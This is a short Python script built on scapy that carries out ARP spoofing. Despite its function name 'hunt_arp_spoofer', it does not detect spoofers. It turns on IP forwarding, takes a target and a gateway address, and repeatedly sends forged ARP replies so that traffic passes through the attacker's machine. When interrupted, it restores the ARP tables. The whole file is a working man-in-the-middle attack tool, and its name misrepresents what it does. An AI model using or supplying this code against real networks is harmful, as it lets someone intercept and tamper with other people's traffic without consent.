#!usr/bin/env python
import subprocess
import socket
import optparse
import scapy.all as scapy
from scapy.layers import http
import time
import sys

def hunt_arp_spoofer():
    def get_mac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc


    def spoof(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


    def restore(destination_ip, source_ip):
      destination_mac = get_mac(destination_ip)
      source_mac = get_mac(source_ip)
      packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
      scapy.send(packet, count=4, verbose=False)

    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    target_ip = input("Target Ip: ")
    gateway_ip = input("Gateway IP: ")

    try:
      sent_packet_count = 0
      while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet sent : " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
    except KeyboardInterrupt:
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print("\n[-] Running echo 0 > /proc/sys/net/ipv4/ip_forward\n")
        print("\n[-]Detected CTRL + C...........Restoring the ARP Tables\n")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
